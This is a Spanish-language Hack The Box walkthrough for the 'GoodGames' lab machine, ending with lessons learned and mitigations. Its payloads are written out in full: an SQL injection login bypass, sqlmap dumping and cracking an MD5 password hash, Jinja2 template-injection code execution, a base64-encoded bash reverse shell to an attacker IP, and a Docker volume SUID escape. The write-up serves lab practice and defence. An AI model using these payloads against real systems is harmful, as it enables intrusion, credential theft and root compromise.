---
title: "HTB Walkthrough: GoodGames"
date: 2026-07-16
draft: false
description: "Walkthrough completo de la máquina GoodGames de Hack The Box. Dificultad Easy, OS Linux. SQL Injection en el login para bypass de autenticación y extracción de credenciales con sqlmap → cracking de hash MD5 → Server-Side Template Injection (SSTI Jinja2) en un panel Flask interno → RCE como root en un contenedor Docker → reutilización de credenciales para pivotar al host → escape del contenedor vía volumen compartido y bit SUID en bash."
tags: ["HackTheBox", "Linux", "Easy", "SQLi", "SQLInjection", "SSTI", "Jinja2", "Docker", "ContainerEscape", "RCE", "MD5", "PrivEsc", "goodgames", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Resolución de **GoodGames** en Hack The Box. Máquina de dificultad **Easy** con sistema operativo **Linux**. La cadena empieza con una **SQL Injection** en el formulario de login que permite tanto el bypass de autenticación como el volcado de la base de datos. Un hash MD5 crackeado da acceso a un panel de administración Flask interno donde el campo de nombre de usuario es vulnerable a **SSTI con Jinja2**, otorgando RCE como `root` dentro de un contenedor Docker. La salida al host real combina **reutilización de credenciales** vía SSH con un **escape de contenedor clásico**: el directorio home del usuario está montado como volumen, y sin `user namespace remapping` el root del contenedor puede plantar un SUID en `bash` que resulta efectivo en el host.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                                                                      |
|----------------|--------------------------------------------------------------------------------------------------------------|
| **Nombre**     | GoodGames                                                                                                    |
| **OS**         | Linux (contenedor Docker + host Debian)                                                                      |
| **Dificultad** | Easy                                                                                                         |
| **IP**         | 10.129.31.181                                                                                                |
| **Técnicas**   | SQL Injection · sqlmap · MD5 cracking · SSTI Jinja2 · Docker escape · SUID bash · Credential Reuse          |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.31.181
```

```
PORT   STATE SERVICE
80/tcp open  http
```

> **💡 Superficie de ataque:** Un único puerto abierto. Toda la investigación pasa por la aplicación web.

---

## 2. Enumeración Web — Portal GoodGames

Al visitar la IP encontramos un blog/tienda de videojuegos.

![Página principal de GoodGames con el menú BLOG / STORE](/img/goodgames1.png)

---

## 3. Explotación — SQL Injection en el Login

### 3.1 Petición de Login Normal (capturada con Burp)

```
POST /login HTTP/1.1
Host: goodgames.htb
Content-Type: application/x-www-form-urlencoded

email=admin%40goodgames.htb&password=1235
```

### 3.2 Bypass de Autenticación

Modificamos el campo `email` con una condición siempre verdadera y comentamos el resto de la consulta:

```
email=admin' or 1 = 1 -- -&password=1235
```

![Pantalla de LOGIN SUCCESSFUL tras el payload SQLi — acceso como admin](/img/goodgames2.png)

![Página de perfil ADMIN'S PROFILE tras el login](/img/goodgames3.png)

> ✅ **SQL Injection confirmada.** La aplicación nos loguea como `admin` sin conocer la contraseña real.

---

## 4. Descubrimiento del Panel Interno

Explorando el panel (icono de engranaje en la barra superior) encontramos una referencia a otro host:

```
http://internal-administration.goodgames.htb/
```

Lo añadimos a `/etc/hosts`:

```bash
echo "10.129.31.181 internal-administration.goodgames.htb" >> /etc/hosts
```

Al visitarlo encontramos un panel de administración Flask (*Flask Volt Dashboard*) con su propio login.

![Login de Flask Volt Dashboard en internal-administration.goodgames.htb](/img/goodgames4.png)

> **💡 Necesitamos credenciales** para este segundo panel. El siguiente paso es extraer la base de datos del portal principal con `sqlmap`.

---

## 5. Extracción de Credenciales con sqlmap

### 5.1 Guardamos la Petición en un Fichero

```bash
cat > goodgames.req << 'EOF'
POST /login HTTP/1.1
Host: goodgames.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

email=admin%40goodgames.htb&password=1235
EOF
```

### 5.2 Confirmación de la Inyección

```bash
sqlmap -r goodgames.req
```

```
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=admin@goodgames.htb' AND (SELECT 5633 FROM (SELECT(SLEEP(5)))RcqB) AND 'Wcif'='Wcif&password=1235
back-end DBMS: MySQL >= 5.0.12
```

### 5.3 Volcado de la Tabla `user`

```bash
sqlmap -r goodgames.req --batch --dbs
# available databases: information_schema, main

sqlmap -r goodgames.req --batch -D main --tables
# tables: user, blog, blog_comments

sqlmap -r goodgames.req --batch -D main -T user --dump
```

```
Database: main
Table: user
[1 entry]
+----+---------------------+-------+----------------------------------+
| id | email               | name  | password                         |
+----+---------------------+-------+----------------------------------+
| 1  | admin@goodgames.htb | admin | 2b22337f218b2d82dfc3b6f77e7cb8ec |
+----+---------------------+-------+----------------------------------+
```

### 5.4 Cracking del Hash MD5

```bash
echo "2b22337f218b2d82dfc3b6f77e7cb8ec" > pass.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
```

```
superadministrator   (?)
```

> **🔑 Credenciales:** `admin` : `superadministrator`

---

## 6. Acceso al Panel Flask Interno

Con `admin` / `superadministrator` accedemos a `internal-administration.goodgames.htb`.

![Panel principal del Flask Volt Dashboard tras el login — gráficas de Sales Value, Customers, Revenue](/img/goodgames5.png)

En el menú lateral, **Settings → General information** tiene un campo `Full Name` editable que se refleja en el panel derecho.

---

## 7. Explotación — Server-Side Template Injection (SSTI)

### 7.1 Confirmación con Expresión Matemática

Insertamos la expresión clásica de SSTI en Jinja2:

```
{{7*7}}
```

![Campo Full Name con {{7*7}} y el resultado 49 reflejado en el panel lateral — SSTI confirmada](/img/goodgames6.png)

> ✅ **SSTI confirmada.** El `49` aparece donde debería estar el nombre — la plantilla evalúa código Python en el servidor.

### 7.2 RCE con Payload de Jinja2

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

![Panel mostrando uid=0(root) gid=0(root) groups=0(root) tras el payload de RCE](/img/goodgames7.png)

> ✅ **RCE como root dentro del contenedor Docker.**

---

## 8. Reverse Shell

Codificamos la shell en base64 para evitar problemas con caracteres especiales:

```bash
echo -ne 'bash -i >& /dev/tcp/10.10.14.211/4444 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTEvNDQ0NCAwPiYx
```

Inyectamos el payload en el campo `Full Name`:

```
{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTEvNDQ0NCAwPiYx${IFS}|base64${IFS}-d|bash').read()}}
```

> **💡 Por qué esta ruta alternativa:** acceder a `os` a través de `config.__class__.__init__.__globals__` evita filtros que bloquean `self.__init__` o `__builtins__` directamente. El `${IFS}` reemplaza los espacios para evitar su interpretación prematura en la petición HTTP.

```bash
nc -nlvp 4444
```

```
Connection received on 10.129.31.181 56342
root@3a453ab39d3d:/backend# whoami
root
```

Estabilizamos la TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm; export SHELL=bash
stty rows 40 cols 150; reset
```

---

## 9. User Flag

```bash
cat /home/augustus/user.txt
```

> 🔑 Flag de usuario obtenida.

---

## 10. Reconocimiento del Entorno — Estamos en un Contenedor

```bash
ls /backend
# Dockerfile  project  requirements.txt

ip addr
# inet 172.19.0.2/16 — IP del contenedor
```

> **💡 Deducción:** el contenedor tiene la IP `172.19.0.2`. Por convención Docker, el host suele ser el `.1` de la misma subred: `172.19.0.1`.

---

## 11. Movimiento Lateral — Reutilización de Credenciales

La contraseña extraída de la base de datos es también la del usuario `augustus` en el host real:

```bash
ssh augustus@172.19.0.1
# password: superadministrator

augustus@GoodGames:~$
```

> ✅ **Acceso al host real como `augustus`.**

---

## 12. Escalada de Privilegios — Escape del Contenedor vía Volumen Compartido

### La Vulnerabilidad

El directorio `$HOME` de `augustus` en el host está **montado como volumen** dentro del contenedor. Docker, sin `user namespace remapping`, hace que el **root del contenedor (UID 0)** y el **root del host (UID 0)** sean el mismo a efectos de permisos sobre ese volumen compartido.

**El plan:** copiar `/bin/bash` al directorio compartido desde el host, luego desde el contenedor (donde somos root) asignarle `root:root` y activar el bit SUID. El resultado es un `bash` con SUID efectivo en el host, ejecutable por `augustus`.

### Paso 1 — Copiar `bash` al directorio compartido (desde el host)

```bash
augustus@GoodGames:~$ cp /bin/bash .
```

### Paso 2 — Plantar el SUID desde el contenedor (como root)

```bash
root@3a453ab39d3d:/backend# chown root:root /home/augustus/bash
root@3a453ab39d3d:/backend# chmod 4755 /home/augustus/bash
```

### Paso 3 — Ejecutar la shell con privilegios desde el host

```bash
augustus@GoodGames:~$ ./bash -p
bash-5.1# id
uid=1000(augustus) gid=1000(augustus) euid=0(root) groups=1000(augustus)
```

> ✅ **EUID 0 obtenido. Escalada a root completada.**

---

## 13. Root Flag

```bash
bash-5.1# cat /root/root.txt
```

> 🏁 Flag de root obtenida.

---

## 14. Resumen y Lecciones Aprendidas

**Ruta de compromiso:**

1. **Recon** → Puerto 80 con portal GoodGames.
2. **SQLi** → `admin' or 1=1 -- -` en el login → bypass de autenticación.
3. **sqlmap** → volcado de BBDD `main` → hash MD5 de `admin`.
4. **John + rockyou** → `superadministrator`.
5. **Panel interno Flask** → `internal-administration.goodgames.htb` → login con credenciales extraídas.
6. **SSTI Jinja2** → campo `Full Name` en Settings evalúa código Python → RCE como root en el contenedor.
7. **Reverse shell** → user flag en `/home/augustus/user.txt`.
8. **SSH** → `augustus@172.19.0.1` con la misma contraseña → acceso al host real.
9. **Volumen compartido** → `bash` con SUID plantado desde el contenedor → `./bash -p` en el host → EUID 0.

**Lo que aprendí con esta máquina:**

- **El bypass de autenticación con SQLi es solo el primer paso, no el objetivo.** El verdadero valor aquí estaba en usar esa misma inyección para extraer credenciales con `sqlmap`. Sin el volcado de la BBDD, el panel interno seguía siendo inaccesible. SQLi como puerta de entrada a la superficie real es el patrón a seguir siempre.

- **Los hashes MD5 sin salt son trivialmente crackeables.** `superadministrator` aparece en los primeros segundos contra rockyou. La diferencia entre MD5 y bcrypt/Argon2 no es de años — es de segundos vs. horas inviables. Cualquier base de datos que almacene MD5 sin salt está efectivamente guardando las contraseñas en claro para un atacante con acceso a ella.

- **SSTI en Jinja2 es RCE si no hay sandboxing.** El campo `Full Name` reflejaba el valor en una plantilla sin ningún tipo de escape. Jinja2 tiene un modo *sandboxed* (`SandboxedEnvironment`) diseñado exactamente para esto — si se renderiza entrada de usuario, ese es el entorno a usar. Sin él, cualquier dato controlado por el atacante que llegue a `render_template_string()` es ejecución de código.

- **"Root en el contenedor" no equivale a "root en el host" — a menos que el aislamiento falle.** En este caso falló de dos maneras simultáneas: las credenciales del sistema se reutilizaron (permitiendo SSH al host), y el volumen compartido sin remapeo de usuarios permitió modificar ficheros del host desde el contenedor. Bastaría con corregir cualquiera de los dos para romper la cadena.

- **El escape por volumen compartido + SUID es elegante precisamente porque no necesita exploits.** Solo aprovecha el comportamiento por defecto de Docker (sin `userns-remap`) y un descuido de configuración (montar el `$HOME` completo del usuario). La defensa correcta no es un parche — es activar `userns-remap` y montar solo lo estrictamente necesario con los mínimos permisos.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| SQL Injection en el formulario de login | Usar consultas parametrizadas (*prepared statements*); nunca concatenar input de usuario en SQL |
| Hash MD5 sin salt para contraseñas | Usar bcrypt, scrypt o Argon2 con salt individual por usuario |
| SSTI en Jinja2 (campo `Full Name`) | No pasar entrada de usuario a `render_template_string()`; usar `render_template` con variables, o `SandboxedEnvironment` si es inevitable |
| RCE como root dentro del contenedor | Ejecutar la app con usuario sin privilegios (`USER` no-root en el Dockerfile); aplicar filesystem `read-only` donde sea posible |
| Reutilización de contraseñas entre panel y sistema operativo | Credenciales distintas y aleatorias por servicio; rotar tras cualquier exposición |
| Volumen compartido sin `user namespace remapping` | Activar `userns-remap` en Docker; montar solo los subdirectorios necesarios con los mínimos permisos; no compartir `$HOME` completos |
